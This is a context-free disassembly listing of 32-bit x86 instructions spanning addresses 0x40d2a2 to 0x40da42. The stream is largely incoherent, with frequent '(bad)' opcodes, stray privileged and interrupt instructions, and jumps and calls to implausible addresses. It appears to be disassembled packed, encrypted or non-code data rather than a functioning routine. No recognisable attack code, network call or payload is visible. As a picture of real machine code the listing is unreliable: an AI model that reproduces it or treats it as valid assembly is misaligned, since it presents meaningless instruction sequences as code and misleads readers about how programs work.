  40d2a2:	push   esi
  40d2a3:	mov    DWORD PTR [edi-0x4],edx
  40d2a6:	push   ecx
  40d2a7:	inc    ebp
  40d2a8:	push   edi
  40d2a9:	mov    al,dh
  40d2ab:	mov    BYTE PTR [esi+0x34d320b],bl
  40d2b1:	mov    ecx,DWORD PTR [ecx+0x45b6f8f8]
  40d2b7:	xor    edi,DWORD PTR ds:0xc7089c89
  40d2bd:	dec    ebp
  40d2be:	cld    
  40d2bf:	mov    ebx,DWORD PTR [eax]
  40d2c1:	or     dl,ch
  40d2c3:	into   
  40d2c4:	inc    ebp
  40d2c5:	iret   
  40d2c6:	or     dl,cl
  40d2c8:	add    BYTE PTR [ebx+ecx*4-0xb007420],cl
  40d2cf:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2d2:	xor    ecx,edx
  40d2d4:	xor    ecx,DWORD PTR [ebp+0x3]
  40d2d7:	mov    eax,DWORD PTR [ebx]
  40d2d9:	hlt    
  40d2da:	bswap  esi
  40d2dc:	rol    DWORD PTR [ecx+esi*1+0x2b32459e],0x89
  40d2e4:	xor    ecx,DWORD PTR [eax]
  40d2e6:	mov    DWORD PTR [ebp-0x8],eax
  40d2e9:	xor    ebx,DWORD PTR [ebp-0x47]
  40d2ec:	call   0x40d17e
  40d2f1:	enter  0x4d45,0x8b
  40d2f5:	mov    eax,edi
  40d2f7:	lock dec ebp
  40d2f9:	inc    ebp
  40d2fa:	mov    DWORD PTR [ebx-0x39040f73],ecx
  40d300:	inc    edi
  40d302:	inc    ebp
  40d303:	enter  0x918b,0xfc
  40d307:	inc    ebp
  40d308:	(bad)  
  40d309:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3962]
  40d310:	mov    DWORD PTR [esi-0x4],ebx
  40d313:	rol    DWORD PTR [ebp-0x37],0x8b
  40d317:	add    al,0xf4
  40d319:	push   ebp
  40d31a:	into   
  40d31b:	in     al,dx
  40d31c:	mov    BYTE PTR [ebp-0x3f],0x8b
  40d320:	dec    ebp
  40d321:	or     BYTE PTR [ebx],bh
  40d323:	xor    BYTE PTR [esi+0x1],0x8b
  40d327:	add    ah,ah
  40d329:	add    dh,al
  40d32b:	in     al,dx
  40d32c:	(bad)  
  40d32d:	push   ebx
  40d32e:	inc    ebp
  40d32f:	mov    eax,edi
  40d331:	adc    al,ch
  40d333:	push   ss
  40d334:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40d33a:	popa   
  40d33b:	iret   
  40d33c:	dec    ebp
  40d33d:	sahf   
  40d33e:	mov    esi,DWORD PTR [edx]
  40d340:	clc    
  40d341:	add    ecx,esi
  40d343:	cmp    ecx,edi
  40d345:	jne    0x40d32f
  40d347:	add    DWORD PTR [ebp-0x62],0x4208648b
  40d34e:	or     BYTE PTR [ebx+0x48ae94d],bl
  40d354:	or     eax,DWORD PTR [eax]
  40d356:	push   ebp
  40d357:	dec    ebp
  40d358:	jnp    0xd00ae027
  40d35e:	dec    ebp
  40d35f:	xlat   BYTE PTR ds:[ebx]
  40d360:	mov    ecx,ebx
  40d362:	call   0x340b293a
  40d367:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  40d36e:	(bad)  
  40d36f:	cld    
  40d370:	sti    
  40d371:	lahf   
  40d372:	(bad)  
  40d373:	mov    ebp,0x8b330055
  40d378:	mov    DWORD PTR [eax],ecx
  40d37a:	clc    
  40d37b:	iret   
  40d37c:	dec    ebp
  40d37d:	retf   
  40d37e:	xor    eax,ecx
  40d380:	lea    eax,[eax+ecx*1+0x7204]
  40d387:	dec    ebp
  40d388:	inc    ebp
  40d389:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  40d38f:	mov    esp,DWORD PTR [edx+0x14]
  40d392:	int    0x6
  40d394:	sub    eax,DWORD PTR [ebp+0x3]
  40d397:	(bad)  
  40d398:	lock or BYTE PTR [ebp-0x7b],cl
  40d39c:	mov    edi,eax
  40d39e:	in     al,dx
  40d39f:	xor    al,0x4d
  40d3a1:	pushf  
  40d3a2:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40d3a8:	jne    0x40d333
  40d3aa:	mov    ebx,DWORD PTR [eax]
  40d3ac:	in     al,0x45
  40d3ae:	dec    ebp
  40d3af:	mov    esi,DWORD PTR [ebx]
  40d3b1:	nop
  40d3b2:	add    eax,DWORD PTR [eax]
  40d3b4:	pop    edi
  40d3b5:	mov    esi,DWORD PTR [ebx]
  40d3b7:	mov    DWORD PTR [ebx-0x2c],ebx
  40d3ba:	ret    0x4d
  40d3bd:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  40d3c3:	mov    ecx,DWORD PTR [ebp+0x3]
  40d3c6:	mov    edi,DWORD PTR [eax+edx*4]
  40d3c9:	dec    ebp
  40d3ca:	add    BYTE PTR [ebx-0x387cf775],cl
  40d3d0:	jo     0x40d395
  40d3d2:	push   esi
  40d3d3:	inc    ebp
  40d3d4:	jne    0x40d361
  40d3d6:	mov    ecx,DWORD PTR [eax]
  40d3d8:	push   edi
  40d3d9:	(bad)  
  40d3da:	push   edi
  40d3db:	ret    
  40d3dc:	push   ecx
  40d3dd:	inc    ebp
  40d3de:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  40d3e4:	add    BYTE PTR [ebx+0x45d10ccb],al
  40d3ea:	jnp    0x406de01d
  40d3f0:	jg     0x40d37d
  40d3f2:	jmp    0x54:0xde85700c
  40d3f9:	inc    ebp
  40d3fa:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  40d3fe:	push   ebp
  40d3ff:	cmp    BYTE PTR [ebx],dh
  40d401:	dec    ebp
  40d402:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  40d408:	cmp    esp,DWORD PTR [ebx]
  40d40a:	jne    0x40d397
  40d40c:	or     DWORD PTR [esi+ebx*4],0xef036440
  40d413:	jmp    0x40d42a
  40d415:	mov    ebp,ecx
  40d417:	push   esp
  40d418:	add    al,0x45
  40d41a:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  40d420:	add    eax,ebx
  40d422:	cmp    eax,DWORD PTR [ebp+0xf]
  40d425:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  40d42c:	sbb    BYTE PTR [ebp+0x45],al
  40d42f:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40d435:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  40d43b:	mov    DWORD PTR [ebp+0x14],eax
  40d43e:	xor    eax,0xba339c45
  40d443:	pushf  
  40d444:	test   edi,eax
  40d446:	clc    
  40d447:	adc    al,0x55
  40d449:	test   DWORD PTR [ebx+0x454518f8],ecx
  40d44f:	xor    DWORD PTR [ebx-0x7f74e764],ecx
  40d455:	lock add DWORD PTR [ebp+0x0],ecx
  40d459:	xor    eax,DWORD PTR [eax]
  40d45b:	add    ecx,DWORD PTR [ebp+0xf]
  40d45e:	mov    eax,ecx
  40d460:	sbb    BYTE PTR [ebp-0x77],cl
  40d463:	mov    eax,DWORD PTR [ecx]
  40d465:	rol    BYTE PTR [eax],1
  40d467:	iret   
  40d468:	or     DWORD PTR [eax+ecx*2+0xc32899e],ecx
  40d46f:	cmp    eax,DWORD PTR [ebp+0xf]
  40d472:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40d479:	or     BYTE PTR [ebp-0x39],al
  40d47c:	xor    eax,ebx
  40d47e:	add    eax,DWORD PTR [ebp-0x77]
  40d481:	mov    edx,DWORD PTR [eax+ebx*1]
  40d484:	inc    ebp
  40d485:	inc    ebp
  40d486:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  40d48c:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  40d492:	mov    ebp,eax
  40d494:	cmp    cl,dh
  40d496:	dec    ebp
  40d497:	dec    DWORD PTR [eax+0x45]
  40d49a:	inc    ecx
  40d49b:	(bad)  
  40d49c:	mov    esp,eax
  40d49e:	or     al,0x85
  40d4a0:	sbb    al,bh
  40d4a2:	inc    eax
  40d4a3:	inc    ebp
  40d4a4:	mov    esi,DWORD PTR [ebx]
  40d4a6:	or     al,0x3
  40d4a8:	dec    ecx
  40d4a9:	push   eax
  40d4aa:	dec    eax
  40d4ab:	inc    ebp
  40d4ac:	rcl    BYTE PTR [eax-0x38],1
  40d4af:	push   eax
  40d4b0:	inc    ebp
  40d4b1:	dec    DWORD PTR [ebx-0x3e07c775]
  40d4b7:	rol    BYTE PTR [ebx],0x4e
  40d4ba:	inc    eax
  40d4bb:	inc    ebp
  40d4bc:	mov    DWORD PTR [ebx],esi
  40d4be:	sbb    BYTE PTR [ebx],al
  40d4c0:	inc    ebp
  40d4c1:	push   eax
  40d4c2:	xor    esi,DWORD PTR [ebp+0x3]
  40d4c5:	lea    ecx,[ecx+0x45e814b8]
  40d4cb:	cmc    
  40d4cc:	xor    edi,edi
  40d4ce:	add    eax,DWORD PTR [ebp-0x77]
  40d4d1:	mov    DWORD PTR [eax+eiz*8],edx
  40d4d4:	inc    ebp
  40d4d5:	inc    ebp
  40d4d6:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  40d4dc:	ret    
  40d4dd:	inc    ebp
  40d4de:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  40d4e4:	adc    al,0x8b
  40d4e6:	test   DWORD PTR [eax],edx
  40d4e8:	clc    
  40d4e9:	inc    ecx
  40d4ea:	inc    ebp
  40d4eb:	mov    esi,DWORD PTR [edx]
  40d4ed:	loopne 0x40d48b
  40d4ef:	enter  0x16c7,0x14
  40d4f3:	inc    ebp
  40d4f4:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  40d4fa:	mov    eax,DWORD PTR [ebx]
  40d4fc:	sbb    BYTE PTR [eax],cl
  40d4fe:	(bad)  
  40d4ff:	dec    ebp
  40d500:	ret    
  40d501:	sub    ebp,DWORD PTR [edi+0x8028be9]
  40d507:	add    BYTE PTR [ebp+0xc],dl
  40d50a:	xor    esi,DWORD PTR [ebp-0x73]
  40d50d:	lea    edx,[ecx]
  40d50f:	lods   al,BYTE PTR ds:[esi]
  40d510:	jb     0x40d4fa
  40d512:	add    ch,dh
  40d514:	sar    edi,0x83
  40d517:	xor    eax,0x89009c03
  40d51c:	inc    ebp
  40d51d:	int3   
  40d51e:	xor    eax,DWORD PTR [ebp+0x3]
  40d521:	xor    al,0x89
  40d523:	pushf  
  40d524:	adc    al,0xc7
  40d526:	inc    ebp
  40d527:	les    eax,FWORD PTR [ebx]
  40d529:	test   esp,ebx
  40d52b:	clc    
  40d52c:	inc    ebp
  40d52d:	inc    ebp
  40d52e:	push   DWORD PTR [edx]
  40d530:	hlt    
  40d531:	pushf  
  40d532:	jne    0x40d4c1
  40d534:	mov    ecx,esp
  40d536:	or     al,0x4d
  40d538:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  40d53e:	clc    
  40d53f:	lea    eax,[ebp-0x3c]
  40d542:	cmp    eax,0x8b8d9c4d
  40d547:	shl    al,0x4d
  40d54a:	(bad)  
  40d54b:	mov    eax,ebx
  40d54d:	or     BYTE PTR [ebp-0x17344731],cl
  40d553:	dec    ebp
  40d554:	imul   ecx
  40d556:	inc    DWORD PTR [ecx]
  40d558:	inc    ebp
  40d559:	add    BYTE PTR [ebp-0x74638bcd],al
  40d55f:	pavgb  mm7,mm6
  40d562:	mov    DWORD PTR [eax],0xf0ff8bc3
  40d568:	clc    
  40d569:	iret   
  40d56a:	inc    ebp
  40d56b:	lock push eax
  40d56d:	retf   
  40d56e:	fmul   QWORD PTR [ebp-0x1]
  40d571:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40d577:	test   BYTE PTR [ebx+0x4d32e09e],cl
  40d57d:	mov    DWORD PTR [ebx],ebp
  40d57f:	loopne 0x40d50a
  40d581:	inc    ebp
  40d582:	loopne 0x40d50f
  40d584:	inc    ebp
  40d585:	loopne 0x40d512
  40d587:	xbegin 0x4091650
  40d58d:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  40d594:	jb     0x40d5e6
  40d596:	mov    ecx,DWORD PTR [eax+edi*8]
  40d599:	inc    ebp
  40d59a:	inc    eax
  40d59b:	push   eax
  40d59c:	mov    ebx,DWORD PTR [edi-0x8]
  40d59f:	inc    DWORD PTR [ecx-0x75]
  40d5a2:	mov    ebp,esp
  40d5a4:	loopne 0x40d5a6
  40d5a6:	rol    edi,0xee
  40d5a9:	test   BYTE PTR [eax],al
  40d5ab:	dec    edx
  40d5ac:	push   0x32
  40d5ae:	dec    DWORD PTR [ebx-0x30baf70c]
  40d5b4:	push   eax
  40d5b5:	mov    dh,0x94
  40d5b7:	add    edi,edi
  40d5b9:	cmp    edi,DWORD PTR [eax-0x7877af1]
  40d5bf:	add    BYTE PTR [ebp-0x75],al
  40d5c2:	(bad)  
  40d5c3:	call   0xc7c5d690
  40d5c8:	clc    
  40d5c9:	test   BYTE PTR [ebp+0x4a],al
  40d5cc:	xor    esi,DWORD PTR [edx]
  40d5ce:	pushf  
  40d5cf:	mov    eax,edi
  40d5d1:	or     al,al
  40d5d3:	iret   
  40d5d4:	test   DWORD PTR [esi+0x3b4d03f8],esi
  40d5da:	mov    DWORD PTR [edi],ecx
  40d5dc:	in     al,dx
  40d5dd:	pop    eax
  40d5de:	dec    ebp
  40d5df:	add    BYTE PTR [ecx+0x4df8e88b],cl
  40d5e5:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  40d5eb:	dec    edx
  40d5ec:	mov    DWORD PTR [edx],esi
  40d5ee:	in     al,0x8b
  40d5f0:	dec    ebp
  40d5f1:	or     BYTE PTR [ebx],dh
  40d5f3:	iret   
  40d5f4:	add    esi,DWORD PTR [esi+0x3be00389]
  40d5fa:	test   DWORD PTR [edi],0x3d3800
  40d600:	test   DWORD PTR [ebx+0x84e4f8],ecx
  40d606:	add    edi,eax
  40d608:	add    BYTE PTR [ebp+ecx*2-0x74cdccb6],al
  40d60f:	mov    eax,DWORD PTR [ebx]
  40d611:	or     BYTE PTR [ecx+0x45b614cf],cl
  40d617:	add    esi,DWORD PTR [ebx]
  40d619:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  40d61f:	add    BYTE PTR [eax],al
  40d621:	mov    eax,DWORD PTR [ebp-0x18]
  40d624:	mov    eax,DWORD PTR [eax]
  40d626:	lock (bad) 
  40d628:	dec    ebp
  40d629:	test   BYTE PTR [ebx],dh
  40d62b:	dec    edx
  40d62c:	add    esi,DWORD PTR [edx]
  40d62e:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  40d634:	or     bh,cl
  40d636:	(bad)  
  40d637:	mov    ebx,es
  40d639:	dec    edx
  40d63a:	push   0x32
  40d63c:	lea    esi,[edx]
  40d63e:	lods   al,BYTE PTR ds:[esi]
  40d63f:	mov    ebp,eax
  40d641:	clc    
  40d642:	cli    
  40d643:	or     edi,edi
  40d645:	iret   
  40d646:	inc    ebp
  40d647:	mov    WORD PTR [ebx-0x75cdccb6],cs
  40d64d:	or     al,BYTE PTR ds:0xec728b
  40d653:	or     DWORD PTR [ebp-0x31],ecx
  40d656:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb2]
  40d65d:	cmp    al,cl
  40d65f:	je     0x40d839
  40d665:	mov    eax,DWORD PTR [ebp-0x8]
  40d668:	mov    eax,DWORD PTR [eax]
  40d66a:	xor    eax,edi
  40d66c:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  40d673:	mov    ecx,DWORD PTR [ebp-0x18]
  40d676:	xor    ecx,DWORD PTR [ecx]
  40d678:	bswap  edi
  40d67a:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb6],0x32
  40d682:	add    DWORD PTR [ebx+0x945e400],ecx
  40d688:	mov    ecx,edi
  40d68a:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054a]
  40d691:	or     al,BYTE PTR [eax]
  40d693:	mov    ecx,DWORD PTR [ebp-0x18]
  40d696:	xor    ecx,DWORD PTR [ecx]
  40d698:	bswap  edi
  40d69a:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb2],0x3a
  40d6a2:	add    DWORD PTR [edi],ecx
  40d6a4:	add    BYTE PTR [eax-0x7474ffbb],dl
  40d6aa:	xor    esp,esp
  40d6ac:	mov    al,BYTE PTR [eax]
  40d6ae:	add    eax,0x8472c7
  40d6b3:	dec    edx
  40d6b4:	dec    ebp
  40d6b5:	xor    dh,BYTE PTR [ebx]
  40d6b7:	mov    ecx,DWORD PTR [edi]
  40d6b9:	clc    
  40d6ba:	ror    BYTE PTR [ecx],0xcb
  40d6bd:	iret   
  40d6be:	ror    DWORD PTR [esp+eax*4+0x32014a],0x32
  40d6c6:	inc    ebp
  40d6c7:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  40d6cd:	iret   
  40d6ce:	add    eax,0x4a728c
  40d6d3:	xor    cl,BYTE PTR [ebp+0xa]
  40d6d6:	mov    ecx,DWORD PTR [ebx+0x98af833]
  40d6dc:	or     eax,0x8c72cf
  40d6e1:	dec    esi
  40d6e2:	shl    DWORD PTR [edx],0x4d
  40d6e5:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  40d6eb:	in     al,0xd
  40d6ed:	add    BYTE PTR [edx-0x39],dh
  40d6f0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  40d6f7:	mov    esi,DWORD PTR [ebx]
  40d6f9:	in     al,dx
  40d6fa:	mov    cl,BYTE PTR [ecx]
  40d6fc:	or     eax,0x8c72cf
  40d701:	dec    edx
  40d702:	enter  0x8532,0x32
  40d706:	add    BYTE PTR [ebx+0x945e800],cl
  40d70c:	mov    ecx,edi
  40d70e:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054a]
  40d715:	or     al,BYTE PTR [eax]
  40d717:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d71a:	mov    ecx,DWORD PTR [ecx]
  40d71c:	xor    ecx,edi
  40d71e:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724e]
  40d725:	cmp    al,cl
  40d727:	jne    0x40d776
  40d729:	lea    ecx,[ebx-0x7517cc54]
  40d72f:	cli    
  40d730:	or     eax,0x4d72ff
  40d735:	cmp    eax,ecx
  40d737:	je     0x40d786
  40d739:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  40d73f:	ret    
  40d740:	or     eax,0x8b7245
  40d745:	lock enter 0x85c7,0x84
  40d74a:	add    BYTE PTR [esi+0x33453200],bl
  40d750:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40d756:	add    eax,0x37233
  40d75b:	cmp    ecx,DWORD PTR [ebp+0xf]
  40d75e:	mov    esi,edi
  40d760:	xor    edi,edi
  40d762:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40d768:	add    BYTE PTR [ebx],dh
  40d76a:	rol    DWORD PTR [ebx],0x4d
  40d76d:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  40d773:	lock or eax,0x33724d
  40d779:	(bad)  
  40d77a:	ror    DWORD PTR [eax],0x4d
  40d77d:	jb     0x40d70a
  40d77f:	add    BYTE PTR [ebx],dh
  40d781:	ja     0x40d70d
  40d783:	sbb    BYTE PTR ds:0x8d7275,cl
  40d789:	xchg   esp,eax
  40d78a:	enter  0x50e8,0xf3
  40d78e:	inc    ebp
  40d78f:	dec    DWORD PTR [ebx-0x7574ccbb]
  40d795:	loopne 0x40d79c
  40d797:	(bad)  
  40d798:	jb     0x40d75d
  40d79a:	add    cl,al
  40d79c:	dec    ebp
  40d79d:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  40d7a3:	add    ecx,DWORD PTR ds:0x187250
  40d7a9:	inc    ebp
  40d7aa:	rcl    DWORD PTR [eax+0x4d],0x4f
  40d7ae:	mov    edi,edi
  40d7b0:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40d7b6:	jb     0x40d741
  40d7b8:	add    BYTE PTR [ecx+eax*8],dl
  40d7bb:	jne    0x40d80a
  40d7bd:	dec    DWORD PTR [ebx-0x75baccec]
  40d7c3:	add    ecx,DWORD PTR ds:0xe872d8
  40d7c9:	repnz enter 0x10ff,0x45
  40d7ce:	inc    ebp
  40d7cf:	mov    edx,DWORD PTR [eax-0x20]
  40d7d2:	mov    ds:0x8bc3ffc7,eax
  40d7d7:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  40d7df:	mov    esi,DWORD PTR [ebx]
  40d7e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7e2:	add    eax,DWORD PTR [ebp-0x77]
  40d7e5:	push   eax
  40d7e6:	adc    al,0x15
  40d7e8:	inc    ebp
  40d7e9:	push   DWORD PTR [ebx]
  40d7eb:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  40d7f1:	add    DWORD PTR [eax],eax
  40d7f3:	mov    eax,edi
  40d7f5:	test   al,0x4d
  40d7f7:	inc    ebp
  40d7f8:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  40d7fe:	retf   
  40d7ff:	mov    edx,ecx
  40d801:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  40d808:	inc    ebp
  40d809:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  40d80f:	xor    eax,ebx
  40d811:	(bad)  
  40d812:	enter  0x1111,0x72
  40d816:	inc    ebp
  40d817:	add    BYTE PTR [ebx-0x387de73f],cl
  40d81d:	cld    
  40d81e:	test   bh,bh
  40d820:	sahf   
  40d821:	jne    0x40d855
  40d823:	mov    ebp,ebx
  40d825:	fsubr  DWORD PTR [edx+0x6]
  40d828:	dec    DWORD PTR [edx]
  40d82a:	hlt    
  40d82b:	xor    eax,0x7f502d45
  40d830:	sbb    ch,ah
  40d832:	call   DWORD PTR [edx-0x75]
  40d835:	pop    esi
  40d836:	or     cl,cl
  40d838:	dec    ebp
  40d839:	adc    al,0x33
  40d83b:	push   ebp
  40d83c:	add    ebp,esp
  40d83e:	cmp    esp,esp
  40d840:	je     0x40d7c5
  40d842:	mov    esp,DWORD PTR [eax]
  40d844:	or     BYTE PTR ds:0x89c39cc7,dh
  40d84a:	push   0x24
  40d84c:	lea    ecx,[ebp+0x44e8ff94]
  40d852:	clc    
  40d853:	or     al,0xff
  40d855:	push   esp
  40d856:	inc    ebp
  40d857:	or     BYTE PTR [ebx+0x450818be],al
  40d85d:	pop    es
  40d85e:	call   esi
  40d860:	test   al,0xbf
  40d862:	jne    0x40d8d6
  40d864:	mov    eax,DWORD PTR [eax]
  40d866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d867:	xlat   BYTE PTR ds:[ebx]
  40d868:	inc    ebp
  40d869:	push   esp
  40d86a:	push   eax
  40d86b:	or     al,0xde
  40d86d:	push   ebp
  40d86e:	dec    DWORD PTR [ecx-0x74f7db75]
  40d874:	dec    ebp
  40d875:	adc    BYTE PTR [ebx],dh
  40d877:	rol    DWORD PTR [ebx],1
  40d879:	sbb    BYTE PTR [ebx],bh
  40d87b:	dec    esp
  40d87c:	je     0x40d892
  40d87e:	push   0x54
  40d880:	call   DWORD PTR [eax]
  40d882:	test   al,0xce
  40d884:	inc    ebp
  40d885:	iret   
  40d886:	add    ebp,DWORD PTR [edi+0x24e889d8]
  40d88c:	clc    
  40d88d:	jmp    0x85da91
  40d892:	mov    edx,eax
  40d894:	test   al,0x1f
  40d896:	or     BYTE PTR [ebp+eax*2+0x10],al
  40d89a:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  40d89e:	inc    ebp
  40d89f:	(bad)  
  40d8a0:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9e]
  40d8a7:	mov    DWORD PTR [ebx],eax
  40d8a9:	and    al,0xf
  40d8ab:	push   0xf84d85c1
  40d8b0:	mov    edi,ebp
  40d8b2:	rol    BYTE PTR [eax],1
  40d8b4:	iret   
  40d8b5:	or     DWORD PTR [ebx+esi*1+0x75329c9e],0x850f683b
  40d8c0:	push   edi
  40d8c1:	clc    
  40d8c2:	(bad)  
  40d8c3:	jmp    0x40d850
  40d8c5:	add    BYTE PTR [eax],dl
  40d8c7:	mov    eax,0xf8898545
  40d8cc:	jmp    0x40d89e
  40d8ce:	add    DWORD PTR [ebp+0x64009e],0x206544bf
  40d8d8:	pop    edi
  40d8d9:	inc    esp
  40d8da:	pop    ebx
  40d8db:	sbb    dl,al
  40d8dd:	inc    ebp
  40d8de:	add    BYTE PTR [ecx-0x747cdb75],cl
  40d8e4:	clc    
  40d8e5:	and    al,0xec
  40d8e7:	mov    DWORD PTR [ecx-0x7747adc],edi
  40d8ed:	and    al,0x4c
  40d8ef:	mov    DWORD PTR [eax],ecx
  40d8f1:	and    al,0x41
  40d8f3:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  40d8f9:	and    al,0x24
  40d8fb:	xor    edx,DWORD PTR [esi+0x3]
  40d8fe:	push   edi
  40d8ff:	mov    DWORD PTR [ecx-0x75],edx
  40d902:	xor    esp,DWORD PTR [edi+edx*2]
  40d905:	mov    ebx,DWORD PTR [esi+0x3003294]
  40d90b:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  40d911:	mov    ecx,DWORD PTR [esp+edx*4]
  40d914:	push   esp
  40d915:	add    BYTE PTR [eax],ah
  40d917:	mov    edx,DWORD PTR [ebp+0x3]
  40d91a:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  40d921:	mov    DWORD PTR [ebx+0x33002401],ecx
  40d927:	dec    ecx
  40d928:	add    ebp,DWORD PTR [edx+0xf]
  40d92b:	push   0x4c30ca
  40d930:	adc    BYTE PTR [eax+0x1f],dh
  40d933:	push   0x0
  40d935:	(bad)  
  40d936:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  40d93c:	and    al,0x24
  40d93e:	mov    esi,DWORD PTR [ebx]
  40d940:	and    al,0x3
  40d942:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40d948:	jb     0x40d96e
  40d94a:	add    bh,bh
  40d94c:	inc    esp
  40d94d:	and    al,0x14
  40d94f:	lea    esi,[ebx]
  40d951:	and    al,0x9c
  40d953:	push   eax
  40d954:	jmp    0x54d99d
  40d959:	(bad)  
  40d95a:	cli    
  40d95b:	and    al,0x85
  40d95d:	(bad)  
  40d95e:	clc    
  40d95f:	and    al,0xa
  40d961:	call   0xffddd298
  40d966:	jmp    0x54d9af
  40d96b:	dec    esp
  40d96c:	aas    
  40d96d:	or     al,0x9c
  40d96f:	(bad)  
  40d970:	cmp    eax,edi
  40d972:	bswap  eax
  40d974:	mov    bh,0x4b
  40d976:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40d97a:	and    al,0x4c
  40d97c:	mov    DWORD PTR [esp],ebx
  40d97f:	(bad)  
  40d980:	mov    eax,edi
  40d982:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40d988:	inc    esp
  40d989:	jmp    0x40d99f
  40d98b:	add    DWORD PTR [edx+esi*1+0x20],0x1075449c
  40d993:	push   0xf8148544
  40d998:	inc    esp
  40d999:	sbb    BYTE PTR [edx+edi*8],dl
  40d99c:	dec    esp
  40d99d:	test   DWORD PTR [eax+edi*8],ebx
  40d9a0:	mov    BYTE PTR [edi],0xc7
  40d9a3:	xor    BYTE PTR [ecx],al
  40d9a5:	pushf  
  40d9a6:	inc    esp
  40d9a7:	jmp    0x40d9c1
  40d9a9:	add    DWORD PTR [eax+0x9c0130],0x44500875
  40d9b3:	jne    0x40d9cd
  40d9b5:	or     DWORD PTR [eax+0x100185],eax
  40d9bb:	or     al,0x0
  40d9bd:	jne    0x40da00
  40d9bf:	call   0xff65d84f
  40d9c4:	mov    eax,DWORD PTR [eax+ebx*8+0xc]
  40d9c8:	add    BYTE PTR [ebx+ecx*4+0xc],al
  40d9cc:	adc    al,0x5e
  40d9ce:	add    al,0xe5
  40d9d0:	add    dl,al
  40d9d2:	add    BYTE PTR [eax],al
  40d9d4:	inc    DWORD PTR [ecx]
  40d9d6:	push   eax
  40d9d7:	cli    
  40d9d8:	add    al,bh
  40d9da:	shl    DWORD PTR [ecx],1
  40d9dc:	inc    esp
  40d9dd:	jmp    0x40d9eb
  40d9df:	xor    DWORD PTR [ebp+esi*2+0x14],eax
  40d9e3:	test   esi,eax
  40d9e5:	cli    
  40d9e6:	(bad)  
  40d9e7:	inc    DWORD PTR [eax+ecx*1+0x24]
  40d9eb:	inc    DWORD PTR [esp+0x1c]
  40d9ef:	and    al,0x74
  40d9f1:	mov    ebx,DWORD PTR [eax]
  40d9f3:	or     al,0x44
  40d9f5:	and    al,0x28
  40d9f7:	and    al,0x8d
  40d9f9:	add    esp,DWORD PTR [esp+esi*2]
  40d9fc:	push   eax
  40d9fd:	and    al,0x74
  40d9ff:	and    al,0x2c
  40da01:	add    esi,DWORD PTR [esp+eax*2+0x24]
  40da05:	ss mov bl,0x7
  40da08:	inc    DWORD PTR [ecx-0x7749775]
  40da0e:	xor    edi,DWORD PTR [esi+0x3b]
  40da11:	mov    ecx,DWORD PTR [ebx+0xf338b5d]
  40da17:	and    al,0x85
  40da19:	pushf  
  40da1a:	pushf  
  40da1b:	clc    
  40da1c:	dec    DWORD PTR [ecx+0x41073f5f]
  40da22:	add    BYTE PTR [ebx+0x7],al
  40da25:	inc    ecx
  40da26:	add    BYTE PTR [edi+0x7],al
  40da29:	inc    ecx
  40da2a:	add    BYTE PTR [ebx+0x7],cl
  40da2d:	inc    ecx
  40da2e:	add    BYTE PTR [edi+0x7],cl
  40da31:	inc    ecx
  40da32:	add    BYTE PTR [ebx+0x7],dl
  40da35:	inc    ecx
  40da36:	add    BYTE PTR [edi+0x7],dl
  40da39:	inc    ecx
  40da3a:	add    BYTE PTR [ebx+0x7],bl
  40da3d:	inc    ecx
  40da3e:	add    ah,dl
  40da40:	(bad)  
  40da41:	in     eax,dx
  40da42:	jp     0x40da33
